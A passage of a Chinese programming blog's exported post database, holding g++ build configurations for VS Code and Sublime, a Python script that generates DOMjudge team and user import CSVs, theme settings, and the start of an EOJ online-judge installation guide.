class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"attr\">&quot;description&quot;</span>: <span class=\"string\">&quot;Enable pretty-printing for gdb&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"attr\">&quot;text&quot;</span>: <span class=\"string\">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"attr\">&quot;ignoreFailures&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t]</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>tasks.json</code><br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">&quot;version&quot;</span>: <span class=\"string\">&quot;2.0.0&quot;</span>,</span><br><span class=\"line\">\t<span class=\"attr\">&quot;command&quot;</span>: <span class=\"string\">&quot;g++&quot;</span>,</span><br><span class=\"line\">\t<span class=\"attr\">&quot;args&quot;</span>: [<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;$&#123;file&#125;&quot;</span>,<span class=\"string\">&quot;-o&quot;</span>,<span class=\"string\">&quot;$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>],\t<span class=\"comment\">// 编译命令参数</span></span><br><span class=\"line\">\t<span class=\"attr\">&quot;problemMatcher&quot;</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">&quot;owner&quot;</span>: <span class=\"string\">&quot;cpp&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">&quot;fileLocation&quot;</span>: [<span class=\"string\">&quot;relative&quot;</span>, <span class=\"string\">&quot;$&#123;workspaceRoot&#125;&quot;</span>],</span><br><span class=\"line\">\t\t<span class=\"attr\">&quot;pattern&quot;</span>: &#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;regexp&quot;</span>: <span class=\"string\">&quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;file&quot;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;line&quot;</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;column&quot;</span>: <span class=\"number\">3</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;severity&quot;</span>: <span class=\"number\">4</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;message&quot;</span>: <span class=\"number\">5</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Sublime\"><a href=\"#Sublime\" class=\"headerlink\" title=\"Sublime\"></a>Sublime</h1><figure class=\"highlight json\"><figcaption><span><code>G++.sublime-build</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"attr\">&quot;cmd&quot;</span>: [<span class=\"string\">&quot;g++&quot;</span>, <span class=\"string\">&quot;$&#123;file&#125;&quot;</span>, <span class=\"string\">&quot;-std=c++11&quot;</span>, <span class=\"string\">&quot;-o&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125;&quot;</span>, <span class=\"string\">&quot;&amp;&quot;</span>, <span class=\"string\">&quot;start&quot;</span>, <span class=\"string\">&quot;cmd&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;file_regex&quot;</span>: <span class=\"string\">&quot;^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$&quot;</span>, <span class=\"attr\">&quot;working_dir&quot;</span>: <span class=\"string\">&quot;$&#123;file_path&#125;&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;selector&quot;</span>: <span class=\"string\">&quot;source.c, source.c++&quot;</span>, <span class=\"attr\">&quot;shell&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;encoding&quot;</span>:<span class=\"string\">&quot;cp936&quot;</span>, </span><br><span class=\"line\">    <span class=\"attr\">&quot;variants&quot;</span>:</span><br><span class=\"line\">    [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">&quot;name&quot;</span> : <span class=\"string\">&quot;Build Only&quot;</span>,</span><br><span class=\"line\">            <span class=\"attr\">&quot;cmd&quot;</span>:[<span class=\"string\">&quot;g++&quot;</span>, <span class=\"string\">&quot;$&#123;file&#125;&quot;</span>, <span class=\"string\">&quot;-std=c++11&quot;</span>, <span class=\"string\">&quot;-o&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125;&quot;</span>]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">&quot;name&quot;</span> : <span class=\"string\">&quot;Run Only&quot;</span>,</span><br><span class=\"line\">            <span class=\"attr\">&quot;cmd&quot;</span> : [<span class=\"string\">&quot;start&quot;</span>, <span class=\"string\">&quot;cmd&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;</span>]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"DOMjudge账号生成脚本","date":"2020-04-08T08:08:24.000Z","mathjax":true,"abbrlink":"a25c27c8","_content":"由于 `DOMjudge` 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 `csv` 导入数据库，配合 `phpmyadmin` 使用。\n<!--more-->\n> $Vesion1.0$  个人赛账号生成脚本\n\n```py\ndef import_team(team_id, Users):\n    team = open('import_team.csv', 'w', encoding='utf-8')\n    for i in range(len(Users)):\n        team.writelines('\"%d\",\"%d\",\"%s\",\"3\",\"1\",\"1\",\"%s\",NULL,NULL,NULL,\"0\"\\n'\n                        % (team_id + i, i + 1, Users[i], Users[i]))\n    team.close()\n\n\ndef import_user(user_id, team_id, Users):\n    user = open('import_user.csv', 'w', encoding='utf-8')\n    for i in range(len(Users)):\n        user.writelines('\"%d\",\"user%02d\",\"%s\",NULL,NULL,NULL,NULL,NULL,NULL,\"1\",\"%d\"\\n'\n                        % (user_id + i, i + 1, Users[i], i + team_id))\n    user.close()\n\n\ndef import_userrole(user_id, Users):\n    userrole = open('import_userrole.csv', 'w', encoding='utf-8')\n    for i in range(len(Users)):\n        userrole.writelines('\"%d\",\"3\"\\n' % (user_id + i))\n    userrole.close()\n\n\nif __name__ == '__main__':\n    User_id = 3 # 视情况而定，默认id为1,2的分别是admin,judgehost,所以这里从3开始\n    Team_id = 1 # 视情况而定，默认初始为 1\n    User = open('user.txt', 'r', encoding='utf-8')\n    User = User.readlines()\n    for j in range(len(User)):\n        User[j] = User[j].strip('\\n')\n    import_team(Team_id, User)\n    import_user(User_id, Team_id, User)\n    import_userrole(User_id, User)\n    print(User)\n```","source":"_posts/DOMjudge账号生成脚本.md","raw":"---\ntitle: DOMjudge账号生成脚本\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - Python\nmathjax: true\ntags:\n  - Domjudge\n  - Python\nabbrlink: a25c27c8\n---\n由于 `DOMjudge` 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 `csv` 导入数据库，配合 `phpmyadmin` 使用。\n<!--more-->\n> $Vesion1.0$  个人赛账号生成脚本\n\n```py\ndef import_team(team_id, Users):\n    team = open('import_team.csv', 'w', encoding='utf-8')\n    for i in range(len(Users)):\n        team.writelines('\"%d\",\"%d\",\"%s\",\"3\",\"1\",\"1\",\"%s\",NULL,NULL,NULL,\"0\"\\n'\n                        % (team_id + i, i + 1, Users[i], Users[i]))\n    team.close()\n\n\ndef import_user(user_id, team_id, Users):\n    user = open('import_user.csv', 'w', encoding='utf-8')\n    for i in range(len(Users)):\n        user.writelines('\"%d\",\"user%02d\",\"%s\",NULL,NULL,NULL,NULL,NULL,NULL,\"1\",\"%d\"\\n'\n                        % (user_id + i, i + 1, Users[i], i + team_id))\n    user.close()\n\n\ndef import_userrole(user_id, Users):\n    userrole = open('import_userrole.csv', 'w', encoding='utf-8')\n    for i in range(len(Users)):\n        userrole.writelines('\"%d\",\"3\"\\n' % (user_id + i))\n    userrole.close()\n\n\nif __name__ == '__main__':\n    User_id = 3 # 视情况而定，默认id为1,2的分别是admin,judgehost,所以这里从3开始\n    Team_id = 1 # 视情况而定，默认初始为 1\n    User = open('user.txt', 'r', encoding='utf-8')\n    User = User.readlines()\n    for j in range(len(User)):\n        User[j] = User[j].strip('\\n')\n    import_team(Team_id, User)\n    import_user(User_id, Team_id, User)\n    import_userrole(User_id, User)\n    print(User)\n```","slug":"DOMjudge账号生成脚本","published":1,"updated":"2020-05-11T09:35:55.902Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkag000hqse5azlgaraf","content":"<p>由于 <code>DOMjudge</code> 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 <code>csv</code> 导入数据库，配合 <code>phpmyadmin</code> 使用。<br><a id=\"more\"></a></p>\n<blockquote>\n<p>$Vesion1.0$  个人赛账号生成脚本</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import_team</span>(<span class=\"params\">team_id, Users</span>):</span></span><br><span class=\"line\">    team = open(<span class=\"string\">&#x27;import_team.csv&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(Users)):</span><br><span class=\"line\">        team.writelines(<span class=\"string\">&#x27;&quot;%d&quot;,&quot;%d&quot;,&quot;%s&quot;,&quot;3&quot;,&quot;1&quot;,&quot;1&quot;,&quot;%s&quot;,NULL,NULL,NULL,&quot;0&quot;\\n&#x27;</span></span><br><span class=\"line\">                        % (team_id + i, i + <span class=\"number\">1</span>, Users[i], Users[i]))</span><br><span class=\"line\">    team.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import_user</span>(<span class=\"params\">user_id, team_id, Users</span>):</span></span><br><span class=\"line\">    user = open(<span class=\"string\">&#x27;import_user.csv&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(Users)):</span><br><span class=\"line\">        user.writelines(<span class=\"string\">&#x27;&quot;%d&quot;,&quot;user%02d&quot;,&quot;%s&quot;,NULL,NULL,NULL,NULL,NULL,NULL,&quot;1&quot;,&quot;%d&quot;\\n&#x27;</span></span><br><span class=\"line\">                        % (user_id + i, i + <span class=\"number\">1</span>, Users[i], i + team_id))</span><br><span class=\"line\">    user.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import_userrole</span>(<span class=\"params\">user_id, Users</span>):</span></span><br><span class=\"line\">    userrole = open(<span class=\"string\">&#x27;import_userrole.csv&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(Users)):</span><br><span class=\"line\">        userrole.writelines(<span class=\"string\">&#x27;&quot;%d&quot;,&quot;3&quot;\\n&#x27;</span> % (user_id + i))</span><br><span class=\"line\">    userrole.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    User_id = <span class=\"number\">3</span> <span class=\"comment\"># 视情况而定，默认id为1,2的分别是admin,judgehost,所以这里从3开始</span></span><br><span class=\"line\">    Team_id = <span class=\"number\">1</span> <span class=\"comment\"># 视情况而定，默认初始为 1</span></span><br><span class=\"line\">    User = open(<span class=\"string\">&#x27;user.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    User = User.readlines()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(len(User)):</span><br><span class=\"line\">        User[j] = User[j].strip(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    import_team(Team_id, User)</span><br><span class=\"line\">    import_user(User_id, Team_id, User)</span><br><span class=\"line\">    import_userrole(User_id, User)</span><br><span class=\"line\">    print(User)</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1407,"excerpt":"<p>由于 <code>DOMjudge</code> 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 <code>csv</code> 导入数据库，配合 <code>phpmyadmin</code> 使用。<br>","more":"</p>\n<blockquote>\n<p>$Vesion1.0$  个人赛账号生成脚本</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import_team</span>(<span class=\"params\">team_id, Users</span>):</span></span><br><span class=\"line\">    team = open(<span class=\"string\">&#x27;import_team.csv&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(Users)):</span><br><span class=\"line\">        team.writelines(<span class=\"string\">&#x27;&quot;%d&quot;,&quot;%d&quot;,&quot;%s&quot;,&quot;3&quot;,&quot;1&quot;,&quot;1&quot;,&quot;%s&quot;,NULL,NULL,NULL,&quot;0&quot;\\n&#x27;</span></span><br><span class=\"line\">                        % (team_id + i, i + <span class=\"number\">1</span>, Users[i], Users[i]))</span><br><span class=\"line\">    team.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import_user</span>(<span class=\"params\">user_id, team_id, Users</span>):</span></span><br><span class=\"line\">    user = open(<span class=\"string\">&#x27;import_user.csv&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(Users)):</span><br><span class=\"line\">        user.writelines(<span class=\"string\">&#x27;&quot;%d&quot;,&quot;user%02d&quot;,&quot;%s&quot;,NULL,NULL,NULL,NULL,NULL,NULL,&quot;1&quot;,&quot;%d&quot;\\n&#x27;</span></span><br><span class=\"line\">                        % (user_id + i, i + <span class=\"number\">1</span>, Users[i], i + team_id))</span><br><span class=\"line\">    user.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">import_userrole</span>(<span class=\"params\">user_id, Users</span>):</span></span><br><span class=\"line\">    userrole = open(<span class=\"string\">&#x27;import_userrole.csv&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(Users)):</span><br><span class=\"line\">        userrole.writelines(<span class=\"string\">&#x27;&quot;%d&quot;,&quot;3&quot;\\n&#x27;</span> % (user_id + i))</span><br><span class=\"line\">    userrole.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    User_id = <span class=\"number\">3</span> <span class=\"comment\"># 视情况而定，默认id为1,2的分别是admin,judgehost,所以这里从3开始</span></span><br><span class=\"line\">    Team_id = <span class=\"number\">1</span> <span class=\"comment\"># 视情况而定，默认初始为 1</span></span><br><span class=\"line\">    User = open(<span class=\"string\">&#x27;user.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    User = User.readlines()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(len(User)):</span><br><span class=\"line\">        User[j] = User[j].strip(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    import_team(Team_id, User)</span><br><span class=\"line\">    import_user(User_id, Team_id, User)</span><br><span class=\"line\">    import_userrole(User_id, User)</span><br><span class=\"line\">    print(User)</span><br></pre></td></tr></table></figure>"},{"title":"EOJ 搭建教程","date":"2019-06-18T02:53:33.000Z","abbrlink":"f29422fd","_content":"# EOJ\n## 克隆EOJ\n```bash\ngit clone https://github.com/ultmaster/eoj3.git\ncd eoj3\n```\n然后执行\n```bash\nsh install.sh\n```\n## 安装依赖\n```bash\npip3 install -r requirements.txt\n```\n如果出现以下情况\n`Command \"python setup.py egg_info\" failed with error code 1 in /tmp/pip-build-twvou5gt/msqlclient/`\n执行以下命令\n```bash\nsudo apt-get install libmysqld-dev\n```\n<!--more-->\n## 安装npm\n```bash\nsudo apt-get install npm\ncd static\nnpm install\ncd ..\n```\n## 创建超级用户\n```bash\npip install django\npython3 manage.py createsuperuser\n```\n## 迁移\n```bash\npython3 manage.py collectstatic\npython3 manage.py makemigrations\npython3 manage.py migrate\n```\n## 运行前端\n运行前先安装一下`redis-server`。\n```bash\nsudo apt-get install redis-server\n```\n此时，可以运行server了。\n```bash\npython3 manage.py runserver 0.0.0.0:80\n```\n此时访问前端，发现页面布局有问题，是因为缺少一个 css 文件，执行下面命令即可。\n```bash\nwget --no-check-certificate -P ./static/css https://acm.ecnu.edu.cn/static/css/app.min.css\n```\n# Ejudge\n## 克隆Ejudge\n随便找个目录，进行以下操作。\n```bash\ngit clone https://github.com/ultmaster/ejudge.git\n```\n## 初始化\n```bash\ncd ejudge\nsh init.sh\n```\n## 安装docker\n```bash\nsudo apt-get install -y docker.io\nsudo apt-get install systemctl\nsystemctl start docker\nsystemctl enable docker\n```\n## 搭建镜像\n修改`ejudge/run/defaultspj/LANG`,将`LANG`文件的回车去掉。\n```bash\nsudo docker build .\n```\n## 